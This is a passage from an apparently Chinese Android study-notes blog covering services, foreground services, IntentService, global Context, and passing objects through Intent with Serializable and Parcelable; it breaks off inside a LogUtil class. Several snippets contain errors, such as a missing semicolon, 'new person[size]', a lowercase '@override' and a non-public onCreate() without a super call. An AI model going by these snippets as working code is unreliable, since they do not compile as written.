ServiceConnection实例，第三个是参数为，BIND_AUTO_CREATE表示活动和服务进行绑定后自动创建服务，这会使得MyService中的onCreate()方法得到执行，但onStartCommand()方法不会执行。</p><p>注意的是任何一个服务在整个应用程序范围内都是通用的，即Myservice可以喝任何一个活动绑定，而且在绑定完成后他们都可以获取到相同的DownloadBinder实例。</p><h2 id="服务的生命周期"><a href="#服务的生命周期" class="headerlink" title="服务的生命周期"></a>服务的生命周期</h2><p>一旦在项目中任何位置调用了Context的startService()方法，相应的服务就会启动，并回调onStartCommand()方法。如果服务还未被创建过，onCreate()方法会先于onStartCommand()方法执行。服务启动后会一直保持运行状态，直到stopService()或stopSelf()方法被调用。另外虽然每调用一次startService()方法，onStartCommand()就会执行一次，但实际上每个服务都只会存在一个实例。所以只需要调用一次stopService()或stopSelf()方法，服务就会停止。</p><p>根据Android系统的机制，一个服务只要被启动或被绑定之后，就会一直处于运行状态，必须要让以上两种条件同时不满足，服务才能被销毁。</p><h2 id="服务的更多技巧"><a href="#服务的更多技巧" class="headerlink" title="服务的更多技巧"></a>服务的更多技巧</h2><h3 id="使用前台服务"><a href="#使用前台服务" class="headerlink" title="使用前台服务"></a>使用前台服务</h3><p>前台服务可以避免因系统出现内存不足的情况时被回收的情况发生。前台服务会一直又一个正在运行的图标在系统状态栏显示。</p><p>修改Myservice：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">"Myservice"</span>,<span class="string">"startDownload execute"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">"Myservice"</span>,<span class="string">"getProgress execute"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onCreate execute"</span>);</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MainActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        PendingIntent pi = PendingIntent.getActivity(<span class="keyword">this</span>, <span class="number">0</span>, intent, <span class="number">0</span>);</span><br><span class="line">        Notification notification = <span class="keyword">new</span> NotificationCompat.Builder(<span class="keyword">this</span>,<span class="string">"default"</span>)</span><br><span class="line">                .setContentTitle(<span class="string">"Myservice"</span>)</span><br><span class="line">                .setContentText(<span class="string">"This is Myservice"</span>)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher))</span><br><span class="line">                .setContentIntent(pi)</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">1</span>, notification);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onStartCommand execute"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onDestroy execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在其中添加了通知的内容，并且调用startForeground()方法将其显示出来。</p><h3 id="使用IntentService"><a href="#使用IntentService" class="headerlink" title="使用IntentService"></a>使用IntentService</h3><p>服务中的代码都是默认运行在主线程中的，可以使用多线程技术，让服务避免ANR的情况：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">    Log.d(<span class="string">"Myservice"</span>,<span class="string">"onStartCommand execute"</span>);</span><br><span class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">//pass</span></span><br><span class="line">            stopSelf();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用stopSelf()可以让服务在执行完毕后自动停止。</p><p>而IntentService可以完成创建新线程和自动停止的功能。</p><p>新建MyIntentService类继承自IntentService，修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyIntentService</span> <span class="keyword">extends</span> <span class="title">IntentService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">MyIntentService</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="string">"MyIntentService"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onHandleIntent</span><span class="params">(Intent intent)</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"MyIntentService"</span>, <span class="string">"Thread id is "</span>+ Thread.currentThread().getId());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">"MyIntentService"</span>, <span class="string">"onDestroy executed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加布局：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/start_intent_service"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Start IntentService"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改MainActivity代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyService.DownloadBinder downloadBinder;</span><br><span class="line">    <span class="keyword">private</span> ServiceConnection connection = <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">            downloadBinder = (MyService.DownloadBinder) service;</span><br><span class="line">            downloadBinder.startDownload();</span><br><span class="line">            downloadBinder.getProgress();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button startService = (Button) findViewById(R.id.start_service);</span><br><span class="line">        startService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button stopService = (Button) findViewById(R.id.stop_service);</span><br><span class="line">        stopService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button bindService = (Button) findViewById(R.id.bind_service);</span><br><span class="line">        bindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button unbindService = (Button) findViewById(R.id.unbind_service);</span><br><span class="line">        unbindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button startIntentService = (Button) findViewById(R.id.start_intent_service);</span><br><span class="line">        startIntentService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">                Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startService(startIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">                Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                stopService(stopIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.bind_service:</span><br><span class="line">                Intent bindIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                bindService(bindIntent, connection, BIND_AUTO_CREATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.unbind_service:</span><br><span class="line">                unbindService(connection);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_intent_service:</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"Thread id is "</span>+ Thread.currentThread().getId());</span><br><span class="line">                Intent intentService = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyIntentService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startService(intentService);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，在AndroidManifest.xml中注册该服务：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".MyIntentService"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>这样就会自动创建一个线程去执行服务，并自动停止了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>服务是Android实现后台运行的解决方案，但其不会自动创建线程，需要手动去实现。</p><p>一个服务的声明周期从onCreate()到onStartCommand()，最终再到onDetory()。另外也可以通过bind()绑定一个服务，并进行通信，但需要相应的unbind()解绑后服务才会被销毁，并且也不会经过onStartCommand()过程。可以通过类似通知的机制将后台服务转变为前台服务从而避免被系统回收。另外也可以使用IntentService类实现自动化创建子线程并自动回收。</p><p>Android的子线程不可以操作主线程的UI，但可以通过异步消息处理机制向主线程发送消息，从而去修改UI。</p><p>Android的异步消息处理机制主要包括Message、Handle、MessageQueue和Looper，通过他们可以实现子线程与主线程的消息传递。</p><h1 id="进阶——高级技巧"><a href="#进阶——高级技巧" class="headerlink" title="进阶——高级技巧"></a>进阶——高级技巧</h1><h2 id="全局获取Context技巧"><a href="#全局获取Context技巧" class="headerlink" title="全局获取Context技巧"></a>全局获取Context技巧</h2><p>Android提供了一个Application类，每当应用程序启动时，系统就会自动将这个类进行初始化，我们可以自己定义一个MyApplication类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Context context;</span><br><span class="line">    <span class="meta">@Override</span> <span class="function"><span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        context = getApplicationContext();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Context <span class="title">getContext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> context;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在<code>&lt;application&gt;</code>标签下修改初始化类：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:name</span>=<span class="string">"con.example.project.MyApplication"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">...</span></span></span><br><span class="line"><span class="tag">             <span class="attr">...</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中project替换成项目名称，这样后在项目中任何地方调用MyApplication.getContext()即可获取到Context了。</p><p>同时一个项目只能配置一个Application，如果有其他的Application，比如LitePal，只需要在MyApplication中调用LitePal的初始化方法即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Context context;</span><br><span class="line">    <span class="meta">@Override</span> <span class="function"><span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        context = getApplicationContext();</span><br><span class="line">        LitePalApplication.initialize(context);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Context <span class="title">getContext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> context;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Intent传递对象"><a href="#使用Intent传递对象" class="headerlink" title="使用Intent传递对象"></a>使用Intent传递对象</h2><p>Intent传递对象通常有两种实现方式：Serializable和Parcelable。</p><h3 id="Serializable方式"><a href="#Serializable方式" class="headerlink" title="Serializable方式"></a>Serializable方式</h3><p>Serializable是序列化的意思，表示将一个对象转换成可存储或可传输的状态。</p><p>比如有一个Person类，包含name和age两个字段，要将其序列化可以这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来FirstActivity中的写法非常简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Person person = <span class="keyword">new</span> Person();</span><br><span class="line">person.setName(<span class="string">"Tom"</span>);</span><br><span class="line">person.setAge(<span class="number">20</span>);</span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">intent.putExtra(<span class="string">"person_data"</span>, person);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p>在SecondActivity种获取这个对象也很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person person = (Person) getIntent().getSerializableExtra(<span class="string">"person_data"</span>);</span><br></pre></td></tr></table></figure><p>这样就实现了用Serializable完成Intent传递对象的功能。</p><h3 id="Parcelable方式"><a href="#Parcelable方式" class="headerlink" title="Parcelable方式"></a>Parcelable方式</h3><p>Parcelable是将一个完整的对象进行分解。</p><p>修改Person代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Parcelable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">        dest.writeString(name);</span><br><span class="line">        dest.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;Person&gt; CREATOR = <span class="keyword">new</span> Parcelable.Creator&lt;Person&gt;()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Person <span class="title">createFromParcel</span><span class="params">(Parcel source)</span></span>&#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.name = source.readString();</span><br><span class="line">            person.age = source.readInt();</span><br><span class="line">            <span class="keyword">return</span> person</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@override</span></span><br><span class="line">        <span class="keyword">public</span> Person[] newArray(<span class="keyword">int</span> size)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> person[size];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的write和read的顺序一定要相同。</p><p>接下来在FirstActivity中的写法和Serializable相同，而在SecondActivity修改为如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person person = (Person) getIntent().getParcelableExtra(<span class="string">"person_data"</span>);</span><br></pre></td></tr></table></figure><p>通常情况下，Parcelable的效率比Serializable更高一些。</p><h2 id="定制日志工具"><a href="#定制日志工具" class="headerlink" title="定制日志工具"></a>定制日志工具</h2><p>新建一个LogUtil类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogUtil</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VERBOSE = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEBUG = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INFO = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WARN = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ERROR = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NOTHING = <span 